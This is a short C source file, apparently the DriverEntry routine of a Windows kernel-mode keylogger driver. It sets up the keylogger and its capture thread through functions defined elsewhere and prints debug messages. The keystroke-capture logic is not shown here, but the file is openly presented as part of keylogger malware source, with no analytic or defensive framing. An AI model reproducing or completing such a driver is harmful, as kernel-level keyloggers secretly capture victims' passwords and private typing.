#include <ntddk.h>
#include "KeyLoger.h"

THREADCONTEXT g_ThreadContext;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
#ifdef DBG
	__debugbreak();
#endif

	DbgPrint("Keyloger DriverEntry Enter\n");

	NTSTATUS ntRet = InitKeylogger(DriverObject, RegistryPath);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}
	
	ntRet = InitKeyloggerThread(DriverObject);
	if (ntRet != STATUS_SUCCESS)
	{
		goto SAFE_EXIT;
	}


SAFE_EXIT:

	DbgPrint("Keyloger DriverEntry Leave\n");

	return STATUS_SUCCESS;
}